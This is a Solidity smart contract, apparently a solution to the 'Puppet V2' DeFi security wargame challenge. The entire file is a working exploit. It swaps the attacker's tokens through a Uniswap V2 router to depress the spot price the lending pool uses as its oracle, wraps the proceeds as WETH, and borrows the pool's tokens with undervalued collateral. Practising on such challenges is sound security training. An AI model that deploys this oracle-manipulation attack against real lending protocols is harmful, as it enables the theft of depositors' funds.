// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IPuppetV2Pool {
    function borrow(uint256 borrowAmount) external;

    function calculateDepositOfWETHRequired(
        uint256 tokenAmount
    ) external view returns (uint256);
}

interface IUniswapV2Router {
    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external returns (uint256);

    function approve(address to, uint256 amount) external;

    function deposit() external payable;
}

contract AttackPuppetV2 {
    IERC20 token;
    IERC20 weth;
    IPuppetV2Pool pool;
    IUniswapV2Router uniswapRouter;
    address player;

    constructor(
        address _token,
        address _weth,
        address _pool,
        address _uniswapRouter
    ) {
        token = IERC20(_token);
        weth = IERC20(_weth);
        pool = IPuppetV2Pool(_pool);
        uniswapRouter = IUniswapV2Router(_uniswapRouter);
        player = msg.sender;
    }

    function attack(address[] memory path) public payable {
        require(msg.sender == player);
        token.transferFrom(
            msg.sender,
            address(this),
            token.balanceOf(msg.sender)
        );
        token.approve(address(uniswapRouter), token.balanceOf(address(this)));
        console.log(token.balanceOf(address(this)));
        uniswapRouter.swapExactTokensForETH(
            token.balanceOf(address(this)),
            100000,
            path,
            address(this),
            block.timestamp * 2
        );
        console.log(address(this).balance);
        console.log(pool.calculateDepositOfWETHRequired(1000000));

        // payable(msg.sender).transfer(address(this).balance);

        weth.deposit{value: address(this).balance}();

        console.log(weth.balanceOf(address(this)));

        weth.approve(address(pool), weth.balanceOf(address(this)));

        pool.borrow(1000000 ether);

        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    receive() external payable {}
}
